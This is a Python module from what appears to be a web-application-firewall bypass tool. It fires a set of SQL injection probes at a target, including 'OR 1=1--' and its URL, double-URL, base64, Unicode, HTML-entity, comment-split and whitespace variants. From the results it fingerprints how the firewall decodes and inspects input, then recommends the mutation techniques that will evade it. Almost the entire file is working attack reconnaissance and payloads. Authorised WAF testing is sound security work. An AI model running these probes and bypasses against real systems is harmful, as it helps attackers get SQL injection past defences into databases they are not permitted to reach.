"""WAF processing-pipeline fingerprinting via strategic binary probing.

Send carefully chosen payloads to determine *how* a WAF normalises and
inspects requests: does it URL-decode? Strip comments? Normalise case?
Use libinjection? Each answer splits a decision tree whose leaves tell
you which mutation families will bypass this specific WAF.

The output is a ``WAFPipeline`` — a boolean feature-vector of the WAF's
processing steps — plus ``recommend_mutations()`` which maps gaps
straight to WAFFEN mutator names.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Optional

from ..core.oracle import Oracle, Target, BLOCKED, THROUGH


@dataclass
class ProbeResult:
    name: str
    payload: str
    baseline: str
    verdict: str        # BLOCKED / THROUGH / DOWN
    interpretation: str


@dataclass
class WAFPipeline:
    decodes_url: bool = False
    decodes_double_url: bool = False
    decodes_unicode: bool = False
    decodes_html_entities: bool = False
    decodes_base64: bool = False
    strips_comments: bool = False
    strips_inline_comments: bool = False
    normalizes_whitespace: bool = False
    normalizes_case: bool = False
    checks_keywords: bool = False
    checks_regex: bool = False
    checks_libinjection: bool = False
    checks_scoring: bool = False
    keyword_before_decode: bool = False
    decode_before_keyword: bool = False

    def processing_order(self) -> list[tuple[str, bool]]:
        return [
            ("URL decode", self.decodes_url),
            ("Double URL decode", self.decodes_double_url),
            ("Unicode normalize", self.decodes_unicode),
            ("HTML entity decode", self.decodes_html_entities),
            ("Base64 decode", self.decodes_base64),
            ("Comment strip", self.strips_comments),
            ("Inline comment strip", self.strips_inline_comments),
            ("Whitespace normalize", self.normalizes_whitespace),
            ("Case normalize", self.normalizes_case),
            ("Keyword match", self.checks_keywords),
            ("Regex match", self.checks_regex),
            ("libinjection", self.checks_libinjection),
            ("Scoring engine", self.checks_scoring),
        ]

    def gaps(self) -> list[str]:
        g = []
        if not self.strips_comments:
            g.append("comments not stripped")
        if not self.normalizes_case:
            g.append("case-sensitive matching")
        if not self.normalizes_whitespace:
            g.append("whitespace not normalised")
        if not self.decodes_double_url:
            g.append("no double URL decode")
        if not self.decodes_base64:
            g.append("no base64 decode")
        if not self.decodes_unicode:
            g.append("no unicode normalisation")
        if not self.decodes_html_entities:
            g.append("no HTML entity decode")
        if not self.checks_libinjection:
            g.append("no libinjection")
        if self.keyword_before_decode:
            g.append("keywords checked before decode")
        return g

    def as_dict(self) -> dict:
        return {
            "decodes_url": self.decodes_url,
            "decodes_double_url": self.decodes_double_url,
            "decodes_unicode": self.decodes_unicode,
            "decodes_html_entities": self.decodes_html_entities,
            "decodes_base64": self.decodes_base64,
            "strips_comments": self.strips_comments,
            "strips_inline_comments": self.strips_inline_comments,
            "normalizes_whitespace": self.normalizes_whitespace,
            "normalizes_case": self.normalizes_case,
            "checks_keywords": self.checks_keywords,
            "checks_regex": self.checks_regex,
            "checks_libinjection": self.checks_libinjection,
            "checks_scoring": self.checks_scoring,
            "keyword_before_decode": self.keyword_before_decode,
            "decode_before_keyword": self.decode_before_keyword,
            "gaps": self.gaps(),
        }


@dataclass
class DecisionTreeReport:
    pipeline: WAFPipeline
    probes: list[ProbeResult] = field(default_factory=list)
    recommended_mutations: list[str] = field(default_factory=list)
    requests_used: int = 0

    def as_dict(self) -> dict:
        return {
            "pipeline": self.pipeline.as_dict(),
            "probes": [{"name": p.name, "verdict": p.verdict,
                        "interpretation": p.interpretation} for p in self.probes],
            "recommended_mutations": self.recommended_mutations,
            "requests_used": self.requests_used,
        }


# ── probes ──────────────────────────────────────────────────────────────

_BASELINE_BLOCKED = "' OR 1=1--"


class WAFDecisionTreeProber:
    """Fingerprint the WAF's processing pipeline via strategic probes."""

    def __init__(self, target: Target, sender=None):
        self.target = target
        self._oracle = Oracle(target, sender=sender)
        self.pipeline = WAFPipeline()
        self._probes: list[ProbeResult] = []
        self._reqs = 0

    def _send(self, payload: str) -> str:
        resp = self._oracle.send(payload)
        self._reqs += 1
        return resp.verdict

    def _probe(self, name: str, payload: str, baseline: str,
               blocked_means: str, through_means: str) -> bool:
        verdict = self._send(payload)
        is_blocked = verdict == BLOCKED
        interp = blocked_means if is_blocked else through_means
        self._probes.append(ProbeResult(name, payload, baseline, verdict, interp))
        return is_blocked

    # ── individual probes ───────────────────────────────────────────────

    def _probe_baseline(self):
        blocked = self._probe(
            "baseline", _BASELINE_BLOCKED, "test",
            "WAF active (blocks basic SQLi)",
            "WAF not active or unknown signature",
        )
        self.pipeline.checks_keywords = blocked

    def _probe_url_decoding(self):
        self.pipeline.decodes_url = self._probe(
            "url_decode", "%27%20OR%201%3D1--", _BASELINE_BLOCKED,
            "WAF decodes URL encoding before inspection",
            "WAF does NOT decode URL encoding",
        )

    def _probe_double_url_decoding(self):
        self.pipeline.decodes_double_url = self._probe(
            "double_url_decode", "%2527%2520OR%25201%253D1--", _BASELINE_BLOCKED,
            "WAF double-decodes URL encoding",
            "WAF does NOT double-decode (single decode only)",
        )

    def _probe_unicode_normalization(self):
        self.pipeline.decodes_unicode = self._probe(
            "unicode_normalize",
            "＇ OR 1=1--",
            _BASELINE_BLOCKED,
            "WAF normalises fullwidth Unicode to ASCII",
            "WAF does NOT normalise Unicode",
        )

    def _probe_html_entities(self):
        self.pipeline.decodes_html_entities = self._probe(
            "html_entity_decode",
            "&#39; OR 1=1--",
            _BASELINE_BLOCKED,
            "WAF decodes HTML entities",
            "WAF does NOT decode HTML entities",
        )

    def _probe_base64_decoding(self):
        self.pipeline.decodes_base64 = self._probe(
            "base64_decode",
            "JyBPUiAxPTEtLQ==",
            _BASELINE_BLOCKED,
            "WAF decodes base64 payloads",
            "WAF does NOT decode base64",
        )

    def _probe_comment_stripping(self):
        self.pipeline.strips_comments = self._probe(
            "comment_strip",
            "' O/**/R 1=1--",
            _BASELINE_BLOCKED,
            "WAF strips inline comments then matches keywords",
            "WAF does NOT strip comments (comment_split bypass possible!)",
        )

    def _probe_inline_comments(self):
        self.pipeline.strips_inline_comments = self._probe(
            "inline_comment_strip",
            "UN/*x*/ION SEL/*y*/ECT 1--",
            _BASELINE_BLOCKED,
            "WAF strips comments inside keywords",
            "WAF does NOT strip comments inside keywords",
        )

    def _probe_whitespace_normalization(self):
        self.pipeline.normalizes_whitespace = self._probe(
            "whitespace_normalize",
            "'\tOR\t1=1--",
            _BASELINE_BLOCKED,
            "WAF normalises tab/newline to space",
            "WAF does NOT normalise whitespace (whitespace_vary bypass possible!)",
        )

    def _probe_case_normalization(self):
        self.pipeline.normalizes_case = self._probe(
            "case_normalize",
            "' oR 1=1--",
            _BASELINE_BLOCKED,
            "WAF lowercases before keyword matching",
            "WAF does case-sensitive matching (case_mix bypass possible!)",
        )

    def _probe_libinjection(self):
        sqli_fingerprinted = self._send("' OR 1=1--") == BLOCKED
        sqli_non_fingerprinted = self._send("' GLOB '*") == BLOCKED
        self._reqs += 0  # already counted in _send
        self.pipeline.checks_libinjection = sqli_fingerprinted and not sqli_non_fingerprinted
        interp = ("libinjection detected (fingerprinted blocked, non-fingerprinted passed)"
                  if self.pipeline.checks_libinjection
                  else "libinjection not conclusive")
        self._probes.append(ProbeResult(
            "libinjection", "' OR 1=1-- vs ' GLOB '*", "",
            BLOCKED if self.pipeline.checks_libinjection else THROUGH, interp))

    def _probe_scoring_engine(self):
        single_kw = self._send("SELECT")
        combined = self._send("' OR 1=1--")
        self.pipeline.checks_scoring = (single_kw != BLOCKED and combined == BLOCKED)
        interp = ("scoring engine detected (single keyword passes, combo blocks)"
                  if self.pipeline.checks_scoring
                  else "no scoring engine behaviour detected")
        self._probes.append(ProbeResult(
            "scoring_engine", "SELECT vs ' OR 1=1--", "",
            BLOCKED if self.pipeline.checks_scoring else THROUGH, interp))

    def _probe_processing_order(self):
        encoded_kw = self._send("' %4fR 1=1--")
        if self.pipeline.decodes_url and encoded_kw == BLOCKED:
            self.pipeline.decode_before_keyword = True
            self.pipeline.keyword_before_decode = False
            interp = "WAF decodes FIRST, then checks keywords"
        elif encoded_kw != BLOCKED:
            self.pipeline.keyword_before_decode = True
            self.pipeline.decode_before_keyword = False
            interp = "WAF checks keywords FIRST (encoding bypass possible!)"
        else:
            interp = "processing order inconclusive"
        self._probes.append(ProbeResult(
            "processing_order", "' %4fR 1=1--", _BASELINE_BLOCKED,
            encoded_kw, interp))

    def _probe_regex(self):
        regex_specific = self._send("' UNION%0aSELECT 1--")
        self.pipeline.checks_regex = (regex_specific == BLOCKED)
        interp = ("regex matching detected (newline in UNION SELECT blocked)"
                  if self.pipeline.checks_regex
                  else "no regex matching detected (newline breaks pattern)")
        self._probes.append(ProbeResult(
            "regex_match", "' UNION%0aSELECT 1--", _BASELINE_BLOCKED,
            regex_specific, interp))

    # ── orchestration ───────────────────────────────────────────────────

    def probe_all(self) -> WAFPipeline:
        self._probe_baseline()
        self._probe_url_decoding()
        self._probe_double_url_decoding()
        self._probe_unicode_normalization()
        self._probe_html_entities()
        self._probe_base64_decoding()
        self._probe_comment_stripping()
        self._probe_inline_comments()
        self._probe_whitespace_normalization()
        self._probe_case_normalization()
        self._probe_libinjection()
        self._probe_scoring_engine()
        self._probe_regex()
        self._probe_processing_order()
        return self.pipeline

    def recommend_mutations(self) -> list[str]:
        rec: list[str] = []
        if not self.pipeline.strips_comments:
            rec.append("ast_comment_split")
        if not self.pipeline.strips_inline_comments:
            rec.append("sql_comment_interleave")
        if not self.pipeline.normalizes_case:
            rec.append("ast_case_mix")
        if not self.pipeline.normalizes_whitespace:
            rec.append("sql_whitespace_vary")
        if not self.pipeline.decodes_double_url:
            rec.append("double_url_encode")
        if not self.pipeline.decodes_base64:
            rec.append("base64")
        if not self.pipeline.decodes_unicode:
            rec.append("unicode_fullwidth")
        if not self.pipeline.decodes_html_entities:
            rec.append("html_entity_encode")
        if not self.pipeline.checks_libinjection:
            rec.append("ast_sqlite_swap")
        if self.pipeline.keyword_before_decode:
            rec.append("url_encode")
        return rec

    def run(self) -> DecisionTreeReport:
        pipeline = self.probe_all()
        mutations = self.recommend_mutations()
        return DecisionTreeReport(
            pipeline=pipeline,
            probes=self._probes,
            recommended_mutations=mutations,
            requests_used=self._reqs,
        )


def write_dtree_json(report: DecisionTreeReport, path: str):
    import json
    with open(path, "w") as f:
        json.dump(report.as_dict(), f, indent=2, ensure_ascii=False)
